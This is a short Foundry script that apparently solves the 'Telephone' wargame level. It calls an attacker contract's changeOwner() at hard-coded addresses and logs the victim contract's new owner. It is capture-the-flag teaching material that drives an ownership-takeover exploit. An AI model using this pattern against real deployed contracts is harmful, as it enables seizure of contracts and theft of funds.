// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {TelephoneOwner} from "src/telephone/TelephoneOwner.sol";
import {Telephone} from "src/telephone/Telephone.sol";

contract TelephoneScript is Script {
    TelephoneOwner internal telephoneOwner;
    Telephone internal telephone;

    function setUp() public virtual {
        telephoneOwner = TelephoneOwner(
            0x8bA30F163978D5eF5e63afE263dCEA850b3AABaB
        );
        telephone = Telephone(0x76D86c10597C3fC95779C8f9fAea872FEd63Acf4);
    }

    function run() public virtual {
        vm.startBroadcast();
        telephoneOwner.changeOwner();
        console2.log(telephone.owner());
        vm.stopBroadcast();
    }
}
